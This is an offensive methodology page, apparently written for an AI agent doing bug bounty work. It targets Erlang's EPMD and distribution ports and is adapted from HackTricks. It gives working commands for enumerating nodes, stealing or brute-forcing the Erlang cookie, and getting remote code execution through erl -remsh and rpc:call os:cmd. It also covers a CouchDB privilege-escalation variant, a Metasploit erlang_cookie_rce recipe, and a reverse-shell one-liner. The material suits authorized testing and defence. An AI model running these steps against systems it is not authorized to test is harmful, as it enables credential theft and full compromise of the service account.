---
technology: "Erlang Port Mapper Daemon (EPMD)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: 1.0 (upstream-only new unit)
source: "rewritten from HackTricks (src/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.md), CC BY-NC 4.0, accessed 2026-11-13"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary sources. Verified 2026-11-13 against: Erlang/OTP erl_dist_protocol spec (2-byte length prefix on every EPMD request; NAMES=110/'n', DUMP=100/'d', KILL=107/'k', PORT2=122/'z', ALIVE2=120; names reply 4-byte port + 'name ~ts at port ~p' lines; MD5(cookie+challenge) handshake; net_kernel drops invalid cookies after ~1s; OTP 23+ protocol v6, OTP 25 drops v5; TLS distribution optional); insinuator blog (default cookie random [A-Z] 20 chars at ~/.erlang.cookie; no brute-force protection; epmd_bf); metasploit-framework exploit/multi/misc/erlang_cookie_rce source read directly (option COOKIE, default RPORT 25672 — a distribution port, NOT 4369; module forges send_name + challenge_reply and delivers a rex `call os cmd` tuple). Companion overview: [[epmd|EPMD]]."
---

# EPMD bug bounty methodology

Target model: TCP/4369 EPMD (enumeration, no auth) fronting one or more distribution ports that authenticate with a shared cookie. End state is a remote shell on the BEAM node (`os:cmd`) with the service account's OS privileges. Wrong-cookie attempts disconnect after about a second — that timeout, not a lockout, is the only guard.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| EPMD NAMES request | 4369 reachable | yes | node names + distribution ports + protocol versions — Info, targeting map |
| Cookie + distribution port | leaked `~/.erlang.cookie` or operator-set weak cookie | credential-gated | `erl -remsh` shell / `rpc:call` → RCE — Critical |
| Weak cookie brute force | short operator-set cookie (default random [A-Z]^20 is infeasible) | yes (no lockout) | cookie recovery → RCE — Critical |
| EPMD KILL request | 4369 reachable | yes | deregisters the daemon / breaks clustering — DoS, do not use in tests |

## Phase 1 — enumerate nodes

```bash
# NAMES request: 2-byte length (0x0001) + request byte 'n' (110) — reply leads with 4-byte EPMD port
printf '\x00\x01\x6e' | nc -v TARGET_IP 4369
# one node's port + distribution versions: length = 1 + name length, request byte 'z' (122), then the name
python3 -c "import socket; s=socket.create_connection(('TARGET_IP',4369)); n=b'rabbit@TARGET_HOST'; s.sendall(len(n+ b'z').to_bytes(2,'big')+b'z'+n); print(s.recv(4096))"
```

```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info TARGET_IP
```

- The nmap output shape: `epmd_port: 4369` plus a `nodes:` list (`name at port` per node). Record every distribution port — that is where phases 2–3 happen.
- With Erlang/OTP installed locally: `erl` then `net_adm:names('TARGET_HOST').` returns the same map.
- DUMP request (byte `100`) is the debug firehose variant; skip it — NAMES is quieter.
- Internet-wide recon: `port:4369 "at port"` on search engines.

## Phase 2 — acquire the cookie

- File: `~/.erlang.cookie` of the account running the node (read it from any compromised host on the estate; `HOME=/ erl -sname ...` works when you hold a shell as that user).
- Deployment artifacts: container images and orchestrator configs setting the Erlang cookie env var, CI variables, configuration management repos — the places operators force a *predictable* cluster-wide cookie.
- Else: short operator-chosen cookies are the realistic brute target; the daemon has no failure counting. The published brute-forcer (epmd_bf, from the insinuator research) needs the target's node distribution port and IP edited into its source; `[A:Z]^20` default cookies are computationally out of reach — say so in the report rather than promising a crack.

## Phase 3 — verify and execute (remote)

```bash
# Verify the cookie: pong = correct, pang (or silent ~1s drop) = wrong
erl -cookie LEAKED_COOKIE -name probe@ATTACKER_HOST
1> net_adm:ping('rabbit@TARGET_HOST').
```

```bash
# Remote shell straight onto the target node — every expression now evaluates there
erl -cookie LEAKED_COOKIE -name probe@ATTACKER_HOST -remsh rabbit@TARGET_HOST
(rabbit@TARGET_HOST)1> os:cmd("id").
```

- `-remsh` gives you the target's own shell; for single commands from your node, `rpc:call('rabbit@TARGET_HOST', os, cmd, ["id"]).` does the same.
- Reverse shell via `rpc:call` with a `python -c 'import socket,subprocess,os;...'` one-liner works when you need an OS shell rather than an Erlang one.

## Phase 4 — local privilege escalation variant

Already on the box as another user? Steal the service account's cookie and pivot into its node — the canonical case is CouchDB:

```bash
HOME=/ erl -sname probe -setcookie LEAKED_COOKIE
1> rpc:call('couchdb@localhost', os, cmd, ["whoami"]).
```

(The `HOME=/` trick when running as root makes Erlang read `/.erlang.cookie`; adjust to wherever the target account's cookie lives.) Any BEAM service with a readable cookie file and a node on localhost replays the same shape.

## Phase 5 — Metasploit

```text
use exploit/multi/misc/erlang_cookie_rce
set COOKIE LEAKED_COOKIE
set RHOST TARGET_IP
set RPORT 25672        # the DISTRIBUTION port from epmd-info — NOT 4369
run
```

Verified from the module source: it forges the `send_name`/challenge-reply handshake itself, then delivers a `rex` tuple invoking `os:cmd` — Unix and Windows targets, command-stager support. The default RPORT 25672 is RabbitMQ's distribution port convention; on other products set it to whatever `epmd-info` reported.

## Decision points

- 4369 open, no nodes listed → distribution disabled or epmd idle; check for clustered services another way.
- `pang`/disconnect on ping → wrong cookie; try every cookie recovered from the estate before brute force.
- Modern OTP peer refuses your forged node → protocol-version gate: OTP 25+ dropped v5 handshakes (pre-OTP-23 peers can't pair); use a matching OTP release as your client.
- Scope note: KILL (`\x6b`) on epmd and aggressive wrong-cookie floods are pure availability impact — enumerate and authenticate instead.

## Tool mapping (named in prose)

nmap with the epmd-info NSE script for enumeration; plain nc for the raw two-byte EPMD requests; a local Erlang/OTP install (`erl`) as the exploit client for `net_adm:names/1`, `net_adm:ping/1`, `-remsh`, and `rpc:call/4`; the epmd_bf cookie brute-forcer from the insinuator research; Metasploit's erlang_cookie_rce module for framework-integrated delivery.
